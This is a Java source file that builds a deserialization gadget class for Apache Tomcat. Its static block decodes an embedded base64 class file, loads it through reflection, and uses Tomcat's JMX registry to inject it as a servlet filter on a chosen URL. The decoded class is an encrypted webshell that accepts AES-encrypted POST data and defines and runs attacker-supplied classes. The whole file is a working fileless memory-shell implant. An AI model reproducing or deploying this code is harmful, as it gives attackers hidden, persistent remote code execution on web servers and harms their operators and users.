package com.sorry.utils.templatesimpl;

import com.sun.jmx.mbeanserver.NamedObject;
import com.sun.jmx.mbeanserver.Repository;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.modeler.Registry;
import sun.misc.BASE64Decoder;

import javax.management.DynamicMBean;
import javax.management.MBeanServer;
import javax.management.ObjectName;
import javax.servlet.DispatcherType;
import javax.servlet.Filter;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Set;


public class TomcatFilter extends AbstractTranslet {
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
    static{
        try{
            String filter64="yv66vgAAADQA1AoAKgBqBwBrBwBsCABtCABuCwADAG8LAAIAcAgAcQoAIAByCABzCwACAHQIAHULAHYAdwgAeAoAeQB6BwB7CgAgAHwKABAAfQoAeQB+BwB/CgAUAGoIAIALAIEAgggAgwgAhAsAAgCFBwCGCgAbAGoKAIcAiAoAGwCJCgB5AIoHAIsKACAAjAcAjQgAjgcAjwcATAkAkACRCgAkAJIKAJMAlAoAIgCVBwCWCgCQAJcKAJMAmAoAJACZCgAqAHIHAJoKAC8AmwsAnACdBwDSBwCfAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABxMY29tL3NvcnJ5L2J1Zy9DdXN0b21GaWx0ZXI7AQAEaW5pdAEAHyhMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7KVYBAAxmaWx0ZXJDb25maWcBABxMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7AQAKRXhjZXB0aW9ucwcAoAEACGRvRmlsdGVyAQBbKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspVgEAAWsBABJMamF2YS9sYW5nL1N0cmluZzsBAAFjAQAVTGphdmF4L2NyeXB0by9DaXBoZXI7AQALcGFnZUNvbnRleHQBAA9MamF2YS91dGlsL01hcDsBAAJiZgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEADmV2aWxDbGFzc0J5dGVzAQACW0IBAAJzYgEAC2RlZmluZWNsYXNzAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAVjbGF6egEAEUxqYXZhL2xhbmcvQ2xhc3M7AQABYQEAEkxqYXZhL2xhbmcvT2JqZWN0OwEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAtmaWx0ZXJDaGFpbgEAG0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOwEAA3JlcQEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEAA3JzcAEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBABZMb2NhbFZhcmlhYmxlVHlwZVRhYmxlAQA1TGphdmEvdXRpbC9NYXA8TGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9PYmplY3Q7PjsBAA1TdGFja01hcFRhYmxlBwBrBwBsBwCaBwChAQAHZGVzdHJveQEAClNvdXJjZUZpbGUBABFDdXN0b21GaWx0ZXIuamF2YQwANAA1AQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQANWC1HZW8tQ291bnRyeQEAASoMAKIAowwApAClAQAEUE9TVAwApgCnAQAQZjVkN2FhM2JhNDkyOWNjMQwAqACpAQABdQcAqgwAqwCsAQADQUVTBwCtDACuAK8BAB9qYXZheC9jcnlwdG8vc3BlYy9TZWNyZXRLZXlTcGVjDACwALEMADQAsgwAOwCzAQARamF2YS91dGlsL0hhc2hNYXABAAdzZXNzaW9uBwC0DAC1ALYBAAdyZXF1ZXN0AQAIcmVzcG9uc2UMALcAuAEAFnN1bi9taXNjL0JBU0U2NERlY29kZXIHALkMALoApQwAuwC8DAC9AL4BABBqYXZhL2xhbmcvU3RyaW5nDAA0AL8BABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBAAtkZWZpbmVDbGFzcwEAD2phdmEvbGFuZy9DbGFzcwcAwAwAwQBRDADCAMMHAMQMAMUAxgwAxwDIAQAQamF2YS9sYW5nL09iamVjdAwAyQDKDADLAMwMAM0AzgEAE2phdmEvbGFuZy9FeGNlcHRpb24MAM8ANQcA0AwAQQDRAQAaY29tL3NvcnJ5L2J1Zy9DdXN0b21GaWx0ZXIBABRqYXZheC9zZXJ2bGV0L0ZpbHRlcgEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BAAlzZXRIZWFkZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7KVYBAAlnZXRNZXRob2QBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEACmdldFNlc3Npb24BACIoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAeamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uAQAMc2V0QXR0cmlidXRlAQAnKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvT2JqZWN0OylWAQATamF2YXgvY3J5cHRvL0NpcGhlcgEAC2dldEluc3RhbmNlAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAhnZXRCeXRlcwEABCgpW0IBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEAFyhJTGphdmEvc2VjdXJpdHkvS2V5OylWAQANamF2YS91dGlsL01hcAEAA3B1dAEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAJZ2V0UmVhZGVyAQAaKClMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyAQAIcmVhZExpbmUBAAxkZWNvZGVCdWZmZXIBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAHZG9GaW5hbAEABihbQilbQgEABShbQilWAQARamF2YS9sYW5nL0ludGVnZXIBAARUWVBFAQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQANc2V0QWNjZXNzaWJsZQEABChaKVYBABRnZXRTeXN0ZW1DbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAd2YWx1ZU9mAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBAA9wcmludFN0YWNrVHJhY2UBABlqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluAQBAKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTspVgEANm9yZy9hcGFjaGUvY2F0YWxpbmEvZmlsdGVycy9BbWF6aW5nRmlsdGVyMTYyNzI3NDczODA4NQEAOExvcmcvYXBhY2hlL2NhdGFsaW5hL2ZpbHRlcnMvQW1hemluZ0ZpbHRlcjE2MjcyNzQ3MzgwODU7ACEAMgAqAAEAMwAAAAQAAQA0ADUAAQA2AAAALwABAAEAAAAFKrcAAbEAAAACADcAAAAGAAEAAAAOADgAAAAMAAEAAAAFADkA0wAAAAEAOwA8AAIANgAAADUAAAACAAAAAbEAAAACADcAAAAGAAEAAAARADgAAAAWAAIAAAABADkA0wAAAAAAAQA9AD4AAQA/AAAABAABAEAAAQBBAEIAAgA2AAACcgAGAA8AAAEeK8AAAjoELMAAAzoFGQUSBBIFuQAGAwAZBLkABwEAEgi2AAmZAOgSCjoGGQS5AAsBABIMGQa5AA0DABIOuAAPOgcZBwW7ABBZGQa2ABESDrcAErYAE7sAFFm3ABU6CBkIEhYZBLkACwEAuQAXAwBXGQgSGBkEuQAXAwBXGQgSGRkFuQAXAwBXGQS5ABoBADoJGQe7ABtZtwAcGQm2AB22AB62AB86CrsAIFkZCrcAIToLEiISIwa9ACRZAxIlU1kEsgAmU1kFsgAmU7YAJzoMGQwEtgAoGQy4ACkGvQAqWQMZClNZBAO4ACtTWQUZCr64ACtTtgAswAAkOg0ZDbYALToOGQ4ZCLYALlexpwAKOgYZBrYAMC0rLLkAMQMAsQABABcBCgEOAC8ABAA3AAAAagAaAAAAFAAGABUADAAWABcAGAAmABkAKgAaADoAGwBBABwAVQAdAF4AHgBvAB8AewAgAIcAIQCQACIApgAjALEAJADPACUA1QAmAPsAJwECACgBCgApAQsALgEOACwBEAAtARUALwEdADAAOAAAAKIAEAAqAOEAQwBEAAYAQQDKAEUARgAHAF4ArQBHAEgACACQAHsASQBKAAkApgBlAEsATAAKALEAWgBNAEQACwDPADwATgBPAAwA+wAQAFAAUQANAQIACQBSAFMADgEQAAUAVABVAAYAAAEeADkA0wAAAAABHgBWAFcAAQAAAR4AWABZAAIAAAEeAFoAWwADAAYBGABcAF0ABAAMARIAXgBfAAUAYAAAAAwAAQBeAK0ARwBhAAgAYgAAABAAA/0BCwcAYwcAZEIHAGUGAD8AAAAGAAIAZgBAAAEAZwA1AAEANgAAACsAAAABAAAAAbEAAAACADcAAAAGAAEAAAA1ADgAAAAMAAEAAAABADkA0wAAAAEAaAAAAAIAaQ==";
            byte[] evil = new BASE64Decoder().decodeBuffer(filter64);
            ClassLoader classloader = Thread.currentThread().getContextClassLoader();
            Method defineclass= classloader.loadClass("java.lang.ClassLoader").getDeclaredMethod("defineClass",byte[].class,Integer.TYPE,Integer.TYPE);
            defineclass.setAccessible(true);
            Class clazz = (Class) defineclass.invoke(classloader,evil,0,evil.length);

            String filterName = "InvokerFilter";
            String urlPattern = "/gis/SyncFilter";
            MBeanServer mBeanServer = Registry.getRegistry(null,null).getMBeanServer();
            Field field = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
            field.setAccessible(true);
            Object obj = field.get(mBeanServer);
            field = Class.forName("com.sun.jmx.interceptor.DefaultMBeanServerInterceptor").getDeclaredField("repository");
            field.setAccessible(true);
            Repository repository = (Repository) field.get(obj);

            Set<NamedObject> objectSet =  repository.query(new ObjectName("Tomcat:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
            Iterator<NamedObject> iterator = objectSet.iterator();
            System.out.println("StrancardContext-Mbean:"+iterator.hasNext());
            while(iterator.hasNext()) {
                try {
                    DynamicMBean dynamicMBean = iterator.next().getObject();
                    field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
                    field.setAccessible(true);
                    obj = field.get(dynamicMBean);

                    field = Class.forName("org.apache.catalina.authenticator.AuthenticatorBase").getDeclaredField("context");
                    field.setAccessible(true);

                    StandardContext standardContext = (StandardContext) field.get(obj);

                    try{
                        field = standardContext.getClass().getDeclaredField("filterConfigs");
                    }catch (Exception e){
                        field = standardContext.getClass().getSuperclass().getDeclaredField("filterConfigs");
                    }

                    field.setAccessible(true);
                    HashMap<String, ApplicationFilterConfig> map = (HashMap<String, ApplicationFilterConfig>) field.get(standardContext);

                    if (map.get(filterName) == null) {
                        System.out.println("[+] Add Dynamic Filter");

                        Class filterDefClass = null;
                        try {
                            filterDefClass = Class.forName("org.apache.catalina.deploy.FilterDef");
                        } catch (ClassNotFoundException e) {
                            filterDefClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
                        }

                        Object filterDef = filterDefClass.newInstance();
                        filterDef.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class}).invoke(filterDef, new Object[]{filterName});
                        Filter filter = (Filter) clazz.newInstance();;

                        filterDef.getClass().getDeclaredMethod("setFilterClass", new Class[]{String.class}).invoke(filterDef, new Object[]{filter.getClass().getName()});
                        filterDef.getClass().getDeclaredMethod("setFilter", new Class[]{Filter.class}).invoke(filterDef, new Object[]{filter});
                        try{
                            standardContext.getClass().getDeclaredMethod("addFilterDef", new Class[]{filterDefClass}).invoke(standardContext, new Object[]{filterDef});
                        }catch (Exception e){
                            standardContext.getClass().getSuperclass().getDeclaredMethod("addFilterDef", new Class[]{filterDefClass}).invoke(standardContext, new Object[]{filterDef});
                        }


                        Class filterMapClass = null;
                        try {
                            filterMapClass = Class.forName("org.apache.catalina.deploy.FilterMap");
                        } catch (Exception e) {
                            filterMapClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
                        }

                        Object filterMap = filterMapClass.newInstance();
                        filterMap.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class}).invoke(filterMap, new Object[]{filterName});
                        filterMap.getClass().getDeclaredMethod("setDispatcher", new Class[]{String.class}).invoke(filterMap, new Object[]{DispatcherType.REQUEST.name()});
                        filterMap.getClass().getDeclaredMethod("addURLPattern", new Class[]{String.class}).invoke(filterMap, new Object[]{urlPattern});
                        try{
                            standardContext.getClass().getDeclaredMethod("addFilterMapBefore", new Class[]{filterMapClass}).invoke(standardContext, new Object[]{filterMap});
                        }catch (Exception e){
                            standardContext.getClass().getSuperclass().getDeclaredMethod("addFilterMapBefore", new Class[]{filterMapClass}).invoke(standardContext, new Object[]{filterMap});
                        }


                        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(new Class[]{Context.class, filterDefClass});
                        constructor.setAccessible(true);
                        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(new Object[]{standardContext, filterDef});
                        map.put(filterName, filterConfig);
                    }
                }catch (Exception e){
                    e.printStackTrace();
                }
            }

        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
